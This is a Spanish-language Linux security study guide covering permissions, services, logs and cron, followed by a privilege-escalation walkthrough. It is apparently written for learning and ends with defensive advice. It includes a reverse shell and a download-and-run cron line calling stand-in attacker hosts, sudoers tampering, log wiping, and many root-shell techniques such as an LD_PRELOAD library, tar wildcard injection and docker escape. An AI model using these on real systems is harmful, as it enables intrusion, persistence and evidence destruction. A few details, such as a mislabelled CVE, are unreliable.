## Usuarios y Permisos en Linux

### Tipos de usuarios

**1. Root (superusuario)**

- Es el "dios" del sistema, puede hacer absolutamente todo
- UID (User ID) = 0
- Prompt: `#` (almohadilla)
- Nunca deberías trabajar como root por seguridad

**2. Usuarios normales**

- UID >= 1000 (en la mayoría de distribuciones)
- Permisos limitados
- Prompt: `$` (dólar)

**3. Usuarios del sistema**

- UID entre 1-999
- Ejecutan servicios (www-data, mysql, nginx, etc.)
- No tienen shell de login normalmente

### Archivos importantes de usuarios

**`/etc/passwd`**: Lista de todos los usuarios del sistema

```
usuario:x:1000:1000:Nombre Completo:/home/usuario:/bin/bash
```

- Campo 1: Nombre de usuario
- Campo 2: `x` (la contraseña está en /etc/shadow)
- Campo 3: UID
- Campo 4: GID (Group ID)
- Campo 5: Información adicional
- Campo 6: Directorio home
- Campo 7: Shell por defecto

**`/etc/shadow`**: Contraseñas hasheadas (solo root puede leer)

```
usuario:$6$salt$hash:18900:0:99999:7:::
```

- Campo 1: Nombre de usuario
- Campo 2: Hash de la contraseña (66 6 = SHA-512)
- Campo 3: Días desde 1/1/1970 del último cambio
- Campo 4: Días mínimos entre cambios
- Campo 5: Días máximos de validez

**`/etc/group`**: Grupos del sistema

```
sudo:x:27:usuario1,usuario2
```

### Sistema de permisos

**Estructura básica:**

```
-rwxr-xr-- 1 usuario grupo 4096 ene 17 10:30 archivo.txt
```

**Desglose:**

- **Primer carácter**: Tipo de archivo
    - `-` = archivo normal
    - `d` = directorio
    - `l` = enlace simbólico
    - `b` = dispositivo de bloque
    - `c` = dispositivo de caracteres
- **Siguientes 9 caracteres**: Permisos (en grupos de 3)
    - **rwx**: Usuario propietario (owner)
    - **r-x**: Grupo propietario
    - **r--**: Otros (everyone else)

**Significado de cada letra:**

- **r** (read = 4): Leer archivos, listar contenido de directorios
- **w** (write = 2): Modificar archivos, crear/eliminar en directorios
- **x** (execute = 1): Ejecutar archivos, entrar en directorios

**Permisos en número (octal):**

- 7 = rwx (4+2+1)
- 6 = rw- (4+2)
- 5 = r-x (4+1)
- 4 = r-- (4)
- 0 = --- (sin permisos)

**Ejemplos:**

- `chmod 755 script.sh` = rwxr-xr-x (dueño todo, otros leer y ejecutar)
- `chmod 644 archivo.txt` = rw-r--r-- (dueño lee/escribe, otros solo leen)
- `chmod 600 id_rsa` = rw------- (solo dueño puede leer/escribir)

### Permisos especiales

**SUID (Set User ID) = 4**

- Cuando se ejecuta un archivo, corre con permisos del dueño (no del usuario que lo ejecuta)
- Se ve como: `rwsr-xr-x`
- Ejemplo: `/usr/bin/passwd` (necesita permisos de root para cambiar contraseñas)
- **¡PELIGRO!**: Si un atacante encuentra un binario SUID de root vulnerable, puede escalar privilegios

**SGID (Set Group ID) = 2**

- Similar a SUID pero para grupos
- En directorios: archivos creados heredan el grupo del directorio
- Se ve como: `rwxr-sr-x`

**Sticky Bit = 1**

- Solo el dueño puede eliminar sus archivos (aunque el directorio sea escribible)
- Común en `/tmp`
- Se ve como: `rwxrwxrwt`

**Comando para buscar archivos con permisos especiales:**

bash

```bash
# Buscar archivos SUID (¡potenciales vectores de escalada!)
find / -perm -4000 -type f 2>/dev/null

# Buscar archivos SGID
find / -perm -2000 -type f 2>/dev/null

# Buscar archivos escribibles por todos
find / -perm -002 -type f 2>/dev/null
```

### Comandos importantes

bash

```bash
# Ver permisos
ls -la

# Cambiar permisos
chmod 755 archivo
chmod u+x script.sh  # añadir ejecución al usuario
chmod g-w archivo    # quitar escritura al grupo

# Cambiar propietario
chown usuario:grupo archivo
chown -R www-data:www-data /var/www/html

# Ver usuario actual y grupos
whoami
id
groups

# Cambiar a root (si tienes permisos sudo)
sudo su -
sudo -i

# Ejecutar comando como otro usuario
sudo -u www-data comando
```

## Servicios en Linux

### ¿Qué son?

Los servicios (daemons) son programas que corren en segundo plano, como servidores web (Apache, Nginx), bases de datos (MySQL), SSH, etc.

### Systemd (gestor moderno de servicios)

**Systemd** es el sistema de inicio más usado actualmente en distribuciones modernas (Ubuntu, Debian, CentOS, Fedora).

**Comandos esenciales:**

bash

```bash
# Ver todos los servicios
systemctl list-units --type=service

# Ver servicios activos
systemctl list-units --type=service --state=running

# Estado de un servicio
systemctl status ssh

# Iniciar/detener/reiniciar
systemctl start nginx
systemctl stop apache2
systemctl restart mysql

# Habilitar/deshabilitar en el arranque
systemctl enable ssh
systemctl disable apache2

# Ver logs de un servicio
journalctl -u ssh
journalctl -u nginx -f  # seguir en tiempo real
```

**Archivos de configuración de servicios:**

- Ubicación: `/etc/systemd/system/` y `/lib/systemd/system/`
- Extensión: `.service`

**Ejemplo de archivo de servicio:**

ini

```ini
[Unit]
Description=Mi aplicación web
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/miapp
ExecStart=/usr/bin/python3 /opt/miapp/app.py
Restart=always

[Install]
WantedBy=multi-user.target
```

### Ataques relacionados con servicios

**1. Servicios mal configurados:**

- Servicios corriendo como root innecesariamente
- Archivos de servicio escribibles por usuarios normales

**2. Exploits de servicios:**

- Vulnerabilidades en servicios expuestos (SSH, Apache, etc.)
- Versiones desactualizadas

**3. Persistencia:**

- Los atacantes crean servicios maliciosos para mantener acceso
- Buscar: `systemctl list-units --type=service | grep -v "loaded active"`

**Comandos de reconocimiento:**

bash

```bash
# Ver puertos abiertos y servicios escuchando
netstat -tulpn
ss -tulpn

# Ver servicios habilitados al inicio
systemctl list-unit-files --type=service --state=enabled

# Buscar archivos de servicio modificables
find /etc/systemd/system -writable -type f 2>/dev/null
```

## Logs en Linux

### ¿Dónde están los logs?

**Directorio principal:** `/var/log/`

**Logs importantes:**

**1. `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RedHat/CentOS)**

- Autenticación SSH
- Comandos sudo
- Intentos de login fallidos

**2. `/var/log/syslog` o `/var/log/messages`**

- Eventos generales del sistema
- Mensajes del kernel

**3. `/var/log/apache2/` o `/var/log/nginx/`**

- `access.log`: Peticiones al servidor web
- `error.log`: Errores del servidor

**4. `/var/log/kern.log`**

- Mensajes del kernel
- Drivers y hardware

**5. `/var/log/dpkg.log` (Debian/Ubuntu) o `/var/log/yum.log` (RedHat)**

- Instalación/eliminación de paquetes

**6. `/var/log/cron.log`**

- Ejecución de tareas programadas

### Journalctl (logs de systemd)

Systemd centraliza logs en un sistema binario (no en texto plano).

bash

```bash
# Ver todos los logs
journalctl

# Logs desde el último arranque
journalctl -b

# Logs de hoy
journalctl --since today

# Logs de las últimas 2 horas
journalctl --since "2 hours ago"

# Logs de un servicio específico
journalctl -u ssh

# Seguir logs en tiempo real
journalctl -f

# Ver logs con prioridad error o superior
journalctl -p err

# Logs de un usuario específico
journalctl _UID=1000
```

### Event IDs importantes en logs de seguridad

**En `/var/log/auth.log`:**

- `Accepted password`: Login exitoso
- `Failed password`: Intento fallido (posible ataque de fuerza bruta)
- `session opened for user`: Nueva sesión de usuario
- `sudo: COMMAND`: Comando ejecutado con sudo
- `New group`/`New user`: Creación de usuarios/grupos

**Patrones sospechosos:**

bash

```bash
# Múltiples intentos fallidos de SSH
grep "Failed password" /var/log/auth.log | wc -l

# Ver IPs que intentaron conectarse
grep "Failed password" /var/log/auth.log | grep -oP '(\d+\.){3}\d+' | sort | uniq -c | sort -nr

# Comandos sudo ejecutados
grep "sudo:" /var/log/auth.log

# Usuarios creados recientemente
grep "new user" /var/log/auth.log
```

### ¿Qué hacen los atacantes con logs?

**1. Borrar evidencia:**

bash

```bash
# Borrar logs (requiere root)
> /var/log/auth.log
echo "" > /var/log/syslog
rm -rf /var/log/*
```

**2. Modificar logs:**

- Editar archivos para eliminar líneas específicas
- Usar herramientas como `sed` para filtrar sus acciones

**3. Desactivar logging:**

bash

```bash
systemctl stop rsyslog
systemctl disable rsyslog
```

**Defensa:**

- Enviar logs a servidor remoto (SIEM)
- Hacer logs de solo lectura: `chattr +a /var/log/auth.log`
- Monitorear cambios en archivos de log

## Cron (Tareas Programadas)

### ¿Qué es Cron?

Cron es el sistema de Linux para ejecutar comandos o scripts de forma automática en horarios específicos.

### Tipos de Cron

**1. Crontab de usuario:**

bash

````bash
# Ver tu crontab
crontab -l

# Editar tu crontab
crontab -e

# Ver crontab de otro usuario (como root)
crontab -u usuario -l
```

**2. Crontab del sistema:**
- Ubicación: `/etc/crontab`
- Directorios: `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`

**3. Archivos individuales:**
- `/var/spool/cron/crontabs/` (contiene crontabs de usuarios)

### Sintaxis de Cron
```
* * * * * comando
│ │ │ │ │
│ │ │ │ └─── Día de la semana (0-7, domingo = 0 o 7)
│ │ │ └───── Mes (1-12)
│ │ └─────── Día del mes (1-31)
│ └───────── Hora (0-23)
└─────────── Minuto (0-59)
````

**Ejemplos:**

bash

```bash
# Cada minuto
* * * * * /ruta/script.sh

# Cada día a las 3:30 AM
30 3 * * * /usr/bin/backup.sh

# Cada lunes a las 9:00 AM
0 9 * * 1 /usr/bin/reporte.sh

# Cada 5 minutos
*/5 * * * * /usr/bin/check.sh

# Primer día de cada mes a medianoche
0 0 1 * * /usr/bin/mensual.sh
```

**Caracteres especiales:**

- `*` = cualquier valor
- `,` = lista de valores (1,3,5)
- `-` = rango (1-5)
- `/` = intervalo (*/5 = cada 5)

### Cron en ciberseguridad

**¿Por qué es importante?**

- Los atacantes usan cron para **persistencia** (mantener acceso)
- Pueden ejecutar código malicioso automáticamente
- Difícil de detectar si no revisas regularmente

**Ataques comunes:**

**1. Reverse shell programada:**

bash

```bash
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1'
```

**2. Descarga y ejecución de malware:**

bash

```bash
*/10 * * * * curl http://malicioso.com/script.sh | bash
```

**3. Modificar archivos del sistema:**

bash

```bash
0 2 * * * echo "atacante ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

**Reconocimiento de cron jobs:**

bash

```bash
# Ver todos los crontabs del sistema
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Ver crontabs de todos los usuarios
for user in $(cut -f1 -d: /etc/passwd); do 
    echo "=== $user ==="; 
    crontab -u $user -l 2>/dev/null; 
done

# Buscar archivos ejecutables en directorios de cron
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# Ver logs de ejecución de cron
grep CRON /var/log/syslog
journalctl -u cron
```

**Archivos escribibles en cron (¡vulnerabilidad!):**

bash

```bash
# Si puedes escribir en un script ejecutado por cron de root...
find /etc/cron* -type f -writable 2>/dev/null
```

**Variables de entorno en Cron:**

bash

```bash
# Cron ejecuta con PATH limitado
PATH=/usr/bin:/bin

# Especificar shell
SHELL=/bin/bash

# Enviar email con resultados
MAILTO=admin@ejemplo.com

# Ejemplo completo en crontab
PATH=/usr/local/bin:/usr/bin:/bin
0 2 * * * /usr/local/bin/backup.sh
```

### Alternativa moderna: Systemd Timers

Systemd también puede programar tareas (más moderno que cron):

bash

```bash
# Ver timers activos
systemctl list-timers

# Ver configuración de un timer
systemctl cat nombre.timer
```

## Elevación de Privilegios en Linux

### ¿Qué es?

Pasar de ser un usuario normal a root (o aumentar tus permisos). Es el objetivo principal después de tener acceso inicial al sistema.

### Vectores comunes de escalada

### 1. **Sudo mal configurado**

**¿Qué es sudo?** Permite a usuarios normales ejecutar comandos específicos como root.

**Ver qué puedes ejecutar con sudo:**

bash

````bash
sudo -l
```

**Salidas peligrosas:**

**Ejemplo 1: Comandos sin contraseña**
```
User usuario may run the following commands on host:
    (ALL) NOPASSWD: /usr/bin/vim
````

**Explotación:**

bash

````bash
sudo vim -c ':!/bin/bash'
# O dentro de vim: :!bash
```

**Ejemplo 2: Scripts editables**
```
(ALL) NOPASSWD: /opt/scripts/backup.sh
````

Si puedes editar `backup.sh`:

bash

```bash
echo "chmod u+s /bin/bash" >> /opt/scripts/backup.sh
sudo /opt/scripts/backup.sh
/bin/bash -p  # Shell con permisos de root
```

**Ejemplo 3: Comandos peligrosos**

Algunos comandos permiten ejecutar shells:

- `find`: `sudo find . -exec /bin/bash \; -quit`
- `less`: `sudo less /etc/profile` luego `!/bin/bash`
- `awk`: `sudo awk 'BEGIN {system("/bin/bash")}'`
- `python`: `sudo python -c 'import os; os.system("/bin/bash")'`

**Recurso útil:** [GTFOBins](https://gtfobins.github.io/) - Lista de binarios que pueden usarse para bypass

### 2. **Binarios SUID/SGID vulnerables**

**Buscar binarios SUID de root:**

bash

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

**SUID esperados (normales):**

- `/usr/bin/passwd`
- `/usr/bin/sudo`
- `/usr/bin/su`
- `/bin/ping`

**SUID sospechosos:**

- Binarios personalizados con SUID
- Programas que no deberían tener SUID

**Ejemplos de explotación:**

**Si `/usr/bin/find` tiene SUID:**

bash

```bash
find . -exec /bin/bash -p \; -quit
```

**Si puedes escribir un archivo que un binario SUID ejecuta:**

bash

```bash
# Si un programa SUID ejecuta un script sin ruta absoluta
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/comando
chmod +x /tmp/comando
./programa_suid  # Ejecutará tu script malicioso
```

### 3. **Capabilities de Linux**

Las capabilities dividen los privilegios de root en unidades más pequeñas.

**Ver capabilities:**

bash

```bash
getcap -r / 2>/dev/null
```

**Capabilities peligrosas:**

- `cap_setuid`: Cambiar UID (convertirse en root)
- `cap_dac_read_search`: Leer cualquier archivo
- `cap_dac_override`: Ignorar permisos de archivos

**Ejemplo:**

bash

```bash
# Si /usr/bin/python tiene cap_setuid
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 4. **Cron jobs escribibles**

**Buscar scripts de cron modificables:**

bash

```bash
# Ver qué corre cron
cat /etc/crontab
ls -la /etc/cron.d/

# Buscar scripts ejecutados por root que puedas modificar
find /etc/cron* -type f -writable 2>/dev/null
```

**Explotación:**

bash

```bash
# Si puedes editar un script que cron ejecuta como root
echo "chmod u+s /bin/bash" >> /ruta/script_cron.sh
# Esperar a que cron lo ejecute
/bin/bash -p
```

### 5. **Kernel exploits**

Vulnerabilidades en el kernel de Linux.

**Ver versión del kernel:**

bash

```bash
uname -a
uname -r
cat /proc/version
```

**Exploits famosos:**

- **Dirty COW** (CVE-2016-5195): Kernel < 4.8.3
- **DirtyCred** (CVE-2022-0847): Kernel 5.8 - 5.16.11
- **PwnKit** (CVE-2021-4034): Pkexec en todas las versiones

**Buscar exploits:**

bash

```bash
searchsploit kernel 5.4.0
```

**⚠️ Precaución:** Los exploits de kernel pueden crashear el sistema

### 6. **Credenciales y contraseñas**

**Lugares donde buscar credenciales:**

bash

```bash
# Historial de comandos
cat ~/.bash_history
cat ~/.zsh_history

# Archivos de configuración
cat ~/.ssh/id_rsa  # Llave privada SSH
cat ~/.bashrc
cat ~/.profile

# Archivos de aplicaciones
find / -name "*.conf" 2>/dev/null | xargs grep -i "password"
find / -name "config.php" 2>/dev/null

# Bases de datos
cat /var/www/html/config.php  # Credenciales de BD

# Contraseñas en memoria
strings /dev/mem | grep -i password

# Variables de entorno
env | grep -i pass
```

**Archivos sensibles:**

bash

```bash
cat /etc/shadow  # Si tienes permisos de lectura
cat /etc/passwd  # Buscar usuarios con /bin/bash
cat /root/.ssh/id_rsa  # Llave SSH de root
```

### 7. **NFS (Network File System) mal configurado**

**Ver shares NFS:**

bash

````bash
cat /etc/exports
showmount -e IP_SERVIDOR
```

**Configuración vulnerable:**
```
/compartido *(rw,no_root_squash)
````

`no_root_squash` significa que si montas como root local, eres root en el share.

**Explotación:**

bash

```bash
# En tu máquina (como root)
mkdir /tmp/nfs
mount -t nfs IP_VICTIMA:/compartido /tmp/nfs
cd /tmp/nfs
cp /bin/bash .
chmod u+s bash
# En la víctima
/compartido/bash -p
```

### 8. **Docker y contenedores**

**Si el usuario está en el grupo docker:**

bash

```bash
id
# Output: uid=1000(usuario) gid=1000(usuario) groups=1000(usuario),999(docker)
```

**Explotación:**

bash

```bash
docker run -v /:/mnt --rm -it ubuntu bash
# Ahora estás en un contenedor con acceso al filesystem completo
chroot /mnt bash
# Eres root en el sistema host
```

### 9. **Wildcards en scripts**

**Script vulnerable:**

bash

```bash
#!/bin/bash
# backup.sh ejecutado por root
tar czf /backup/backup.tar.gz /home/usuario/*
```

**Explotación:**

bash

```bash
cd /home/usuario
echo "chmod u+s /bin/bash" > exploit.sh
chmod +x exploit.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh exploit.sh"
# Cuando root ejecute el script tar:
/bin/bash -p
```

### 10. **LD_PRELOAD y LD_LIBRARY_PATH**

Si `sudo -l` muestra `env_keep+=LD_PRELOAD`:

**Crear librería maliciosa:**

c

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

**Compilar y ejecutar:**

bash

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so COMANDO_PERMITIDO
```

### Herramientas de enumeración automatizada

**LinPEAS** (Linux Privilege Escalation Awesome Script):

bash

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Linux Smart Enumeration (LSE):**

bash

```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
chmod +x lse.sh
./lse.sh -l 1  # Level 1 (más rápido)
```

**LinEnum:**

bash

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Estas herramientas buscan automáticamente:

- Binarios SUID
- Sudo mal configurado
- Cron jobs
- Capabilities
- Archivos escribibles
- Kernel vulnerable
- Y mucho más

### Checklist manual de reconocimiento

bash

```bash
# 1. Información del sistema
uname -a
cat /etc/issue
cat /etc/*-release

# 2. Usuario actual y privilegios
whoami
id
sudo -l

# 3. Usuarios del sistema
cat /etc/passwd | grep -v nologin
cat /etc/shadow  # Si tienes acceso

# 4. Red
ifconfig
ip a
netstat -tulpn
ss -tulpn

# 5. Procesos
ps aux | grep root
ps aux

# 6. Archivos SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 7. Capabilities
getcap -r / 2>/dev/null

# 8. Cron
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# 9. Archivos escribibles
find / -writable -type f 2>/dev/null | grep -v proc
find / -perm -002 -type f 2>/dev/null

# 10. Servicios
systemctl list-units --type=service --state=running

# 11. Variables de entorno
env
echo $PATH
```

---

## Resumen del flujo de ataque en Linux

1. **Acceso inicial**: SSH, vulnerabilidad web, phishing
2. **Enumeración**: Ejecutar scripts como LinPEAS, revisar sudo -l
3. **Identificar vector**: Encontrar SUID, cron, sudo vulnerable
4. **Elevar privilegios**: Explotar la vulnerabilidad encontrada
5. **Persistencia**: Crear usuario, añadir llave SSH, cron job
6. **Borrar rastros**: Limpiar logs, historial

## Defensas generales

- **Principio de mínimo privilegio**: No dar más permisos de los necesarios
- **Actualizar regularmente**: Parchear kernel y software
- **Auditar sudo**: Revisar `/etc/sudoers` regularmente
- **Monitorear SUID**: Alertar cuando se crean nuevos binarios SUID
- **Centralizar logs**: Enviar a servidor SIEM externo
- **Deshabilitar servicios innecesarios**: Menos superficie de ataque
- **AppArmor/SELinux**: Políticas de control de acceso obligatorio
- **Fail2ban**: Bloquear IPs con intentos fallidos de login
- **Autenticación fuerte**: Usar llaves SSH en lugar de contraseñas

**Piensa en Linux como un edificio:** los permisos son las cerraduras, los servicios son las habitaciones siempre abiertas, los logs son las cámaras de seguridad, cron son los eventos programados automáticamente, y la elevación de privilegios es cuando alguien encuentra la forma de conseguir la llave maestra sin autorización.